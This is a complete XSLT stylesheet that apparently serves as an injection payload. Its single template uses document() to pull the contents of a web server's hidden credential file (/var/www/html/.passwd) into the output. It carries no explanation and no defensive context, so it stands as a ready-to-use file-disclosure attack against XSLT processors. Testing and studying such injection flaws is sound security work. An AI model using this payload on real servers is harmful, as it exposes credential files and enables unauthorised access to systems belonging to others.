<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
        <contenu_du_fichier>
            <xsl:copy-of select="document('file:///var/www/html/.passwd')"/>
        </contenu_du_fichier>
    </xsl:template>
</xsl:stylesheet>